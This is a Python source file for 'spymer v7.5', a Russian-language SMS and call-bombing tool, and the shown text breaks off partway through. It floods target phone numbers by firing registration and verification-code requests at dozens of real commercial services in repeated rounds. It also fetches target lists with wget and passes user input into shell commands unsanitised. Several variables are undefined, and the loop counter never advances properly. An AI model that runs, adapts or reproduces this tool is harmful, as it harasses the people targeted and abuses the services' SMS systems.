#!/usr/bin/python3
# spymer v7.5
# Author: FSystem88
import requests
import random
import datetime
import sys
import time
import argparse
import os
import json
from colorama import Fore, Back, Style

os.system('cls' if os.name=='nt' else 'clear')


def Main():
	global info
	global proxy
	ver = '75'
	version = requests.post("https://rainbow-t-shirt.com/spymer/version.php").json()["version"]
	if int(ver) < int(version):
		info = Back.RED+"\nВерсия устарела и нуждается в обновлении!"+Style.RESET_ALL
	else:
		info = " "
	proxy = "localhost"
	logo = Fore.GREEN+"8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.7.5      8888\n8888     MPL-2.0     8888\n8888888888888888888888888\n8888888888888888888888888"+Style.RESET_ALL
	def main():
		global info
		global proxy		
		global ip
		global port
		while True:
			os.system('cls' if os.name=='nt' else 'clear')
			print(logo)
			print(info)
			print("Proxy: "+Fore.BLUE+"{}".format(proxy)+Style.RESET_ALL)
			print ("1) СМС спамер.")
			print("2) Добавить телефон в антиспам лист.")
			print("3) Проверить телефон в антиспам листе.")
			print("4) Спамер звонков (beta, RU).")
			print("5) Обновить прокси.")
			print("6) Обновить SPYMER.")
			print("7) Выход.")
			input1 = input(Fore.BLUE+"Введите номер пункта: "+Style.RESET_ALL)
			if input1 == "1":
				os.system('cls' if os.name=='nt' else 'clear')
				print(logo)
				print(info)
				print("Выберите один вариант:")
				print("1. Запустить спамер на один номер")
				print("2. Выгрузить номера из TXT файла ")
				print("3. Выгрузить номера по токену")
				input11= input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
				if input11 == "3":
					try:
						os.system('cls' if os.name=='nt' else 'clear')
						print(logo)
						print(info)
						print("Введите токен: ")
						print("Загрузить файл и получить токен можно по ссылке:")
						print(Fore.BLUE+"http://FSystem88.ru/spymer/\n"+Style.RESET_ALL)
						token=input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
						id=requests.post('https://rainbow-t-shirt.com/spymer/spym.php', data={'token': token}).json()["id"]
						if int(id) != 0:
							os.system("rm -rf ~/spymer/{}".format(token))
							os.system("wget -P ~/spymer/ https://rainbow-t-shirt.com/spymer/{}".format(token))
							os.system("cd ~/spymer")
							info=""
							os.system('cls' if os.name=='nt' else 'clear')
							print(logo)
							print(info)
							with open(token) as file:
								array = [row.strip() for row in file]
								print('Введите количество кругов ("Enter" - отмена):')
								count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
								try:
									if int(count):
										count=int(count)
										iteration = 0
										while iteration < count:
											for phone in array:
												try:
													if int(phone):
														_phone=phone
														if _phone[0] == '+':
															_phone = _phone[1:]
														if _phone[0] == '8':
															_phone = '7'+_phone[1:]
														if _phone[0] == '9':
															_phone = '7'+_phone
														info = '\nТокен: {}\nТелефон: {}\n№ круга: {}'.format(token, phone, iteration+1)
														os.system('cls' if os.name=='nt' else 'clear')
														print(logo)
														print(info)
														id=requests.post('https://rainbow-t-shirt.com/spymer/json.php', data={'phone': _phone}).json()["id"]
														if int(id) > 0:
															print(Fore.RED+"\nНомер телефона {} находится в антиспам листе.\nПриступаю к следующему номеру.".format(phone)+Style.RESET_ALL)
															time.sleep(5)
														elif int(id)==0:
															_name = ''
															for x in range(12):
																_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
																password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
																username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))		
															_phone9 = _phone[1:]
															_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]	
															_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
															_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
															_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]	
															_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
															_phone = phone
															_email = _name+f'{iteration}'+'@gmail.com'
															email = _email
															print('\nСпамер запущен.\nЕсли хочешь остановить - нажмите Ctrl+Z.')
															if proxy=="localhost":
																proxies=None
															else:
																proxies="{'"+ssl+"':'"+ip+"'}"
															try:
																try:
																	requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://alfalife.cc/auth.php", data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://app.benzuber.ru/login", data={"phone": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.citilink.ru/registration/confirm/phone/+" + _phone + "/")
																except:
																	pass
																try:
																	requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://app.cloudloyalty.ru/demo/send-code",json={"country": 2,"phone": _phone,"roistatVisit": "47637","experiments": {"new_header_title": "1"},}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3,}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.easypay.ua/api/auth/register",json={"phone": _phone, "password": _name}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.get("https://findclone.ru/register", params={"phone": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://icq.com/smscode/login/ru",data={"msisdn": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+" +_phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown",}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": name,"application": "lkp","login": "+" +_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone": _phone, "Type": 1}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + _phone,"api": 2,"email": "email","x-email": "x-email",}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": _phone, "do": "phone"}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": _phone,"user_info[email]": email,"user_info[password]": name,"user_info[conf_password]": name,}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+" + _phone,"klient_email": email}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": _phone,"email": email}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://auth.multiplex.ua/login", json={"login": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": ""}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": _phone,"registration": "N"}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" +_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.ollis.ru/gql",json={"query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'% _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": _phone, "otpId": 0}, proxies=proxies)
																except:
																	pass
																try:
																	requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://plink.tech/resend_activation_token/?via=call",json={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://plink.tech/register/", json={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode",headers={"token": "."},data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms",json={"userPhone": "+" + _phone},headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+" +_phone, "resend": 0}, proxies=proxies)
																except:
																	pass
																try:
																	requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",params={"oper": 9, "callmode": 1, "phone": "+" +_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+" +_phone, "action": "confirm_mobile"}, proxies=proxies)
																except:
																	pass
																try:
																	requests.get("https://www.sportmaster.ua/",params={"module": "users", "action": "SendSMSReg", "phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone":_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://msk.tele2.ru/api/validation/number/" +_phone,json={"sender": "Tele2"}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number":_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" +_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://passport.twitch.tv/register?trusted_request=true",json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp","include_verification_code": True,"password": name,"phone_number": _phone,"username": name}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://pay.visa.ru/api/Auth/code/request",json={"phoneNumber": "+" +_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName": name,"firstName": name,"middleName": name,"mobilePhone":_phone,"email": email,"smsCode": ""}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn":_phone},headers={"App-ID": "cabinet"}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone":_phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://www.yaposhka.kh.ua/customer/account/createpost/",data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": _phone}, proxies=proxies)
																except:
																	pass
																try:
																	requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": _phone}, proxies=proxies)
																except:
																	pass
															except:
																pass
												except:
													os.system('cls' if os.name=='nt' else 'clear')
													print(logo)
													print(Fore.RED+'\n"{}" не является номером телефона.'.format(phone)+Style.RESET_ALL)
													time.sleep(3)
											iteration=+1
								except:
									info = Fore.RED+"\nНекорректно введено количество кругов!"+Style.RESET_ALL

								info = Fore.BLUE+"\nГотово.\Токен: {}\nКол-во кругов: {}".format(token, iteration)+Style.RESET_ALL
					except:
						info="Отмена.\n"

				elif input11 == "2":
					try:	
						os.system('cls' if os.name=='nt' else 'clear')
						print(logo)
						print(info)
						print("Введите путь к папке: ")
						print("(Папка должна находиться в домашней дирректории!)")
						dirc=input(Fore.BLUE+"spymer > ~/"+Style.RESET_ALL)
						print("Введите имя файла: ")
						txt=input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
						os.system("cd ~/{}".format(dirc))
						os.system('cls' if os.name=='nt' else 'clear')
						print(logo)
						print(info)
						with open(txt) as file:
							array = [row.strip() for row in file]
							print('Введите количество кругов ("Enter" - отмена):')
							count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
							try:
								if int(count):
									count=int(count)
									iteration = 0
									while iteration < count:
										for phone in array:
											try:
												if int(phone):
													_phone=phone
													if _phone[0] == '+':
														_phone = _phone[1:]
													if _phone[0] == '8':
														_phone = '7'+_phone[1:]
													if _phone[0] == '9':
														_phone = '7'+_phone
													info = '\nФайл: {}\nТелефон: {}\n№ круга: {}'.format(txt, phone, iteration+1)
													os.system('cls' if os.name=='nt' else 'clear')
													print(logo)
													print(info)
													id=requests.post('https://rainbow-t-shirt.com/spymer/json.php', data={'phone': _phone}).json()["id"]
													if int(id) > 0:
														print(Fore.RED+"\nНомер телефона {} находится в антиспам листе.\nПриступаю к следующему номеру.".format(phone)+Style.RESET_ALL)
														time.sleep(5)
													elif int(id)==0:
														_name = ''
														for x in range(12):
															_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
															password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
															username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))		
														_phone9 = _phone[1:]
														_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]	
														_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
														_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
														_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]	
														_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
														_phone = phone
														_email = _name+f'{iteration}'+'@gmail.com'
														email = _email
														print('\nСпамер запущен.\nЕсли хочешь остановить - нажмите Ctrl+Z.')
														if proxy=="localhost":
															proxies=None
														else:
															proxies="{'"+ssl+"':'"+ip+"'}"
														try:
															try:
																requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://alfalife.cc/auth.php", data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://app.benzuber.ru/login", data={"phone": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.citilink.ru/registration/confirm/phone/+" + _phone + "/")
															except:
																pass
															try:
																requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://app.cloudloyalty.ru/demo/send-code",json={"country": 2,"phone": _phone,"roistatVisit": "47637","experiments": {"new_header_title": "1"},}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3,}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.easypay.ua/api/auth/register",json={"phone": _phone, "password": _name}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.get("https://findclone.ru/register", params={"phone": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://icq.com/smscode/login/ru",data={"msisdn": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request","phone": "+" +_phone,"phone_permission": "unknown","stream_id": 0,"v": 3,"appversion": "3.20.6","osversion": "unknown","devicemodel": "unknown",}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",data={"password": name,"application": "lkp","login": "+" +_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms",headers={"Agent": "website"},json={"Phone": _phone, "Type": 1}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",json={"phone": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + _phone,"api": 2,"email": "email","x-email": "x-email",}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",data={"phone": _phone, "do": "phone"}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.menu.ua/kiev/delivery/registration/direct-registration.html",data={"user_info[fullname]": name,"user_info[phone]": _phone,"user_info[email]": email,"user_info[password]": name,"user_info[conf_password]": name,}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://mobileplanet.ua/register",data={"klient_name": name,"klient_phone": "+" + _phone,"klient_email": email}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.monobank.com.ua/api/mobapplink/send",data={"phone": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.moyo.ua/identity/registration",data={"firstname": name,"phone": _phone,"email": email}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://auth.multiplex.ua/login", json={"login": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": ""}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.nl.ua",data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode","phone": _phone,"registration": "N"}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" +_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.ollis.ru/gql",json={"query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'% _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",json={"phone": _phone, "otpId": 0}, proxies=proxies)
															except:
																pass
															try:
																requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://plink.tech/resend_activation_token/?via=call",json={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://plink.tech/register/", json={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode",headers={"token": "."},data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://pass.rutube.ru/api/accounts/phone/send-password/",json={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://app.sberfood.ru/api/mobile/v3/auth/sendSms",json={"userPhone": "+" + _phone},headers={"AppKey": "WebApp-3a2605b0cf2a4c9d938752a84b7e97b6"}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+" +_phone, "resend": 0}, proxies=proxies)
															except:
																pass
															try:
																requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",params={"oper": 9, "callmode": 1, "phone": "+" +_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+" +_phone, "action": "confirm_mobile"}, proxies=proxies)
															except:
																pass
															try:
																requests.get("https://www.sportmaster.ua/",params={"module": "users", "action": "SendSMSReg", "phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone":_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://msk.tele2.ru/api/validation/number/" +_phone,json={"sender": "Tele2"}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number":_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": "+" +_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://passport.twitch.tv/register?trusted_request=true",json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp","include_verification_code": True,"password": name,"phone_number": _phone,"username": name}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://pay.visa.ru/api/Auth/code/request",json={"phoneNumber": "+" +_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName": name,"firstName": name,"middleName": name,"mobilePhone":_phone,"email": email,"smsCode": ""}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn":_phone},headers={"App-ID": "cabinet"}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone":_phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://api.chef.yandex/api/v2/auth/sms", json={"phone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://www.yaposhka.kh.ua/customer/account/createpost/",data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": _phone}, proxies=proxies)
															except:
																pass
															try:
																requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": _phone}, proxies=proxies)
															except:
																pass
														except:
															pass
											except:
												os.system('cls' if os.name=='nt' else 'clear')
												print(logo)
												print(Fore.RED+'\n"{}" не является номером телефона.'.format(phone)+Style.RESET_ALL)
												time.sleep(3)
										iteration=+1
							except:
								info = Fore.RED+"\nНекорректно введено количество кругов!"+Style.RESET_ALL

							info = Fore.BLUE+"\nГотово.\Файл: {}\nКол-во кругов: {}".format(txt, iteration)+Style.RESET_ALL
					except:
						info="Отмена.\n Если отмена не была запланирована проверьте правильность введенных данных/пути к файлу/имени файла."

				elif input11 == "1":
					try:
						os.system('cls' if os.name=='nt' else 'clear')
						print(logo)
						print(info)
						print('Введите телефон ("Enter" - отмена):')
						phone = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
						try:
							if int(phone):
								print('Введите количество кругов ("Enter" - отмена):')
								count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
								try:
									if int(count):
										count=int(count)
										_phone=phone
										if _phone[0] == '+':
											_phone = _phone[1:]
										if _phone[0] == '8':
											_phone = '7'+_phone[1:]
										if _phone[0] == '9':
											_phone = '7'+_phone
										iteration = 0
										id=requests.post('https://rainbow-t-shirt.com/spymer/json.php', data={'phone': _phone}).json()["id"]
										if int(id) > 0:
											info = Fore.RED+"\nНомер телефона находится в антиспам листе."+Style.RESET_ALL
										elif int(id)==0:
											_name = ''
											for x in range(12):
												_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
												password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
												username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))		
											_phone9 = _phone[1:]
											_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]	
